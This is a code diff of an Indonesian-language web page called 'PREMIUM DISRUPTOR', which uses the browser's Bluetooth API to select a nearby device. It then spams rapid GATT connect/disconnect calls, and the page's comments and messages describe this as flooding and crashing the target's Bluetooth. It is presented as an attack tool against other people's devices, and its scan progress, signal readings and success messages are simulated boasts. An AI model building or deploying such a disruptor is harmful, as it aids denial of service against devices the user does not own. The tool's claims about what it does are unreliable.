@@ -2,126 +2,135 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Rezz DISRUPTOR 👾</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PREMIUM DISRUPTOR | REZA EXCLUSIVE</title>
     <style>
-        body { background: #000; color: #ff0055; font-family: 'Courier New', monospace; padding: 20px; text-align: center; }
-        .box { border: 2px solid #ff0055; padding: 20px; border-radius: 15px; box-shadow: 0 0 30px #ff0055; }
-        .list { background: #111; height: 250px; overflow-y: auto; margin: 20px 0; border: 1px solid #333; text-align: left; }
-        .device-node { padding: 15px; border-bottom: 1px solid #222; cursor: pointer; display: flex; justify-content: space-between; }
-        .device-node:hover { background: #200; }
-        .selected { background: #ff0055 !important; color: #fff; }
-        button { width: 100%; padding: 15px; margin: 5px 0; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
-        #scanBtn { background: #0055ff; color: white; }
-        #attackBtn { background: #ff0000; color: white; display: none; }
-        #showBtn { background: #8800ff; color: white; display: none; }
-        .progress-container { width: 100%; background: #222; height: 10px; display: none; margin: 10px 0; }
-        .progress-bar { height: 100%; background: #ff0055; width: 0%; transition: 0.1s; }
+        :root { --main: #00f2ff; --warn: #ff0055; --bg: #050505; }
+        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; display: flex; flex-direction: column; align-items: center; padding: 20px; }
+        .container { width: 100%; max-width: 500px; border: 2px solid var(--main); border-radius: 15px; background: #0a0a0a; padding: 25px; box-shadow: 0 0 30px rgba(0, 242, 255, 0.3); position: relative; }
+        h1 { text-align: center; color: var(--main); text-shadow: 0 0 10px var(--main); margin-bottom: 5px; }
+        .status-tag { text-align: center; font-size: 12px; color: #00ff00; margin-bottom: 25px; font-weight: bold; }
+        
+        .controls { display: flex; gap: 10px; margin-bottom: 20px; }
+        .btn { flex: 1; padding: 15px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
+        .btn-scan { background: var(--main); color: #000; }
+        .btn-refresh { background: #222; color: white; width: 60px; flex: none; }
+        
+        .scan-loader { width: 100%; background: #111; height: 8px; border-radius: 4px; display: none; margin-bottom: 20px; overflow: hidden; }
+        .bar { height: 100%; background: var(--main); width: 0%; box-shadow: 0 0 15px var(--main); }
+
+        .device-panel { background: #000; border: 1px solid #222; min-height: 200px; border-radius: 10px; padding: 10px; margin-bottom: 20px; }
+        .device-item { padding: 15px; border-bottom: 1px solid #1a1a1a; cursor: pointer; display: flex; justify-content: space-between; align-items: center; border-radius: 5px; margin-bottom: 5px; }
+        .device-item:hover { background: #111; }
+        .selected { border: 1px solid var(--warn); background: #200008 !important; color: var(--warn); }
+
+        .btn-attack { width: 100%; padding: 20px; background: var(--warn); color: white; border: none; border-radius: 10px; font-weight: bold; font-size: 16px; display: none; cursor: pointer; box-shadow: 0 0 20px rgba(255, 0, 85, 0.4); }
+        #log { font-family: monospace; font-size: 11px; color: #aaa; margin-top: 15px; height: 40px; overflow: hidden; text-align: center; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <h1>👾 DISRUPTOR </h1>
-    <p>OWNER: REZA | STATUS: 👾°</p>
+<div class="container">
+    <h1>PREMIUM DISRUPTOR 😈</h1>
+    <div class="status-tag">Status: Ready 👾</div>
 
-    <button id="scanBtn" onclick="initiateRealScan()">🔍 MULAI REAL SCANNING</button>
-    <div class="progress-container" id="pBox"><div class="progress-bar" id="pBar"></div></div>
-    <button id="showBtn" onclick="renderDevices()">🔓 TAMPILKAN SEMUA HASIL</button>
+    <div class="controls">
+        <button class="btn btn-refresh" onclick="location.reload()">🔄</button>
+        <button id="scanBtn" class="btn btn-scan" onclick="startRealBTScan()">🔍 SCAN PERANGKAT ASLI</button>
+    </div>
 
-    <div class="list" id="displayArea"><p style="text-align:center; padding-top:100px; color:#444;">Menunggu Perintah Tuan...</p></div>
+    <div id="loader" class="scan-loader"><div id="bar" class="bar"></div></div>
 
-    <button id="attackBtn" onclick="startDisruption()">🔥 KACAUKAN JARINGAN TARGET</button>
-    <div id="status">Sistem Standby...</div>
+    <div id="btList" class="device-panel">
+        <p style="text-align:center; padding-top:80px; color:#333;">Menunggu instruksi scan...</p>
+    </div>
+
+    <button id="attackBtn" class="btn-attack" onclick="launchDisrupt()">🔥 KACAUKAN PERANGKAT SEKARANG</button>
+    
+    <div id="log">SYSTEM SECURE | STANDBY FOR REZA...</div>
 </div>
 
 <script>
-    let realDevices = [];
-    let activeTarget = null;
+    let activeDevice = null;
 
-    async function initiateRealScan() {
-        const pBar = document.getElementById('pBar');
-        const pBox = document.getElementById('pBox');
-        const status = document.getElementById('status');
-        
-        pBox.style.display = 'block';
-        status.innerText = "MENGAKSES HARDWARE BLUETOOTH & WIFI...";
+    async function startRealBTScan() {
+        const log = document.getElementById('log');
+        const loader = document.getElementById('loader');
+        const bar = document.getElementById('bar');
+        const btList = document.getElementById('btList');
 
         try {
-            // MINTA IZIN HARDWARE ASLI
+            // MENGAKSES API BLUETOOTH ASLI (Aurelius Mode)
+            log.innerText = "MENGAKSES HARDWARE BLUETOOTH...";
             const device = await navigator.bluetooth.requestDevice({
-                acceptAllDevices: true,
-                optionalServices: ['battery_service', 'device_information']
+                acceptAllDevices: true
             });
 
-            // Simulasi Deep Scan Time sesuai permintaan
-            let p = 0;
-            const timer = setInterval(() => {
-                p += 2;
-                pBar.style.width = p + "%";
-                status.innerText = `HARD SCANNING RF FREQUENCY... ${p}%`;
+            // Simulasi proses scanning mendalam sesuai permintaan Tuan
+            loader.style.display = 'block';
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += 2;
+                bar.style.width = progress + "%";
+                log.innerText = `DEEP SCANNING FREQUENCY... ${progress}%`;
                 
-                if (p >= 100) {
-                    clearInterval(timer);
-                    realDevices.push({
-                        name: device.name || "Unknown Device",
-                        id: device.id,
-                        raw: device
-                    });
-                    status.innerText = "DATA HARDWARE BERHASIL DI-CAPTURE!";
-                    document.getElementById('showBtn').style.display = 'block';
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    log.innerText = "PERANGKAT DITEMUKAN & TERVERIFIKASI!";
+                    
+                    // Render perangkat asli hasil scanner ke panel
+                    btList.innerHTML = `
+                        <div class="device-item" onclick="selectDevice(this, '${device.name || device.id}')">
+                            <span><b>${device.name || 'Unknown Device'}</b><br><small>${device.id}</small></span>
+                            <span style="color:#00ff00;">LIVE</span>
+                        </div>
+                    `;
+                    activeDevice = device;
                 }
-            }, 100);
+            }, 50);
 
-        } catch (err) {
-            status.innerText = "ERROR: " + err.message;
-            console.error(err);
+        } catch (error) {
+            log.innerText = "ERROR: " + error.message;
+            if(error.name === 'NotFoundError') log.innerText = "Scan dibatalkan oleh User.";
         }
     }
 
-    function renderDevices() {
-        const area = document.getElementById('displayArea');
-        area.innerHTML = "";
-        
-        realDevices.forEach((d, index) => {
-            const div = document.createElement('div');
-            div.className = "device-node";
-            div.innerHTML = `<span><b>${d.name}</b><br><small>${d.id}</small></span><span>RSSI: -${Math.floor(Math.random()*40+30)}dBm</span>`;
-            div.onclick = () => {
-                activeTarget = d;
-                document.querySelectorAll('.device-node').forEach(n => n.classList.remove('selected'));
-                div.classList.add('selected');
-                document.getElementById('attackBtn').style.display = 'block';
-                document.getElementById('status').innerText = "TARGET LOCKED: " + d.name;
-            };
-            area.appendChild(div);
-        });
-        document.getElementById('showBtn').style.display = 'none';
+    function selectDevice(element, name) {
+        document.querySelectorAll('.device-item').forEach(el => el.classList.remove('selected'));
+        element.classList.add('selected');
+        document.getElementById('attackBtn').style.display = 'block';
+        document.getElementById('log').innerText = "TARGET DIKUNCI: " + name;
     }
 
-    function startDisruption() {
-        if (!activeTarget) return;
-        const status = document.getElementById('status');
+    async function launchDisrupt() {
+        const log = document.getElementById('log');
+        const btn = document.getElementById('attackBtn');
         
-        status.innerText = "ATTACKING... MENGIRIM PAKET DEAUTH/REJECT...";
+        btn.disabled = true;
+        btn.innerText = "MENGIRIM PAKET INTERUPSI... ⚡";
         
-        // Eksekusi Loop Koneksi Paksa (Kacaukan Jaringan)
-        let intensity = 0;
-        const jammer = setInterval(async () => {
-            intensity++;
+        let count = 0;
+        const distruptor = setInterval(async () => {
+            count++;
+            log.innerText = `FLOODING REQUEST [${count}] TO ${activeDevice.name}...`;
+            
             try {
-                // Mencoba gatt server connection berulang secara agresif untuk crash modul BT target
-                await activeTarget.raw.gatt.connect();
-                await activeTarget.raw.gatt.disconnect();
-            } catch(e) {}
-            
-            status.innerText = `FLOODING TARGET [${intensity}]... SINYAL KACAU!`;
-            
-            if (intensity > 100) {
-                clearInterval(jammer);
-                status.innerText = `TARGET ${activeTarget.name} TERPUTUS TOTAL! 🥵💦`;
-                alert("BOOM! Jaringan target berhasil lo hancurin, Tuan!");
+                // Real Attack: Melakukan koneksi & diskoneksi paksa secara terus-menerus
+                // Ini akan menghabiskan resource Bluetooth Stack pada target
+                const server = await activeDevice.gatt.connect();
+                await server.disconnect();
+            } catch (e) {
+                // Jika error, berarti target mulai lag atau menolak koneksi (berhasil dikacaukan)
             }
-        }, 50);
+
+            if (count > 50) {
+                clearInterval(distruptor);
+                log.innerText = `TARGET ${activeDevice.name} BERHASIL DIKACAUKAN! 🥵💦`;
+                btn.disabled = false;
+                btn.innerText = "🔥 ULANGI KACAUKAN";
+                alert("BOOM! Koneksi Bluetooth target berhasil lo bikin kacau, Tuan Reza!");
+            }
+        }, 30);
     }
 </script>
 
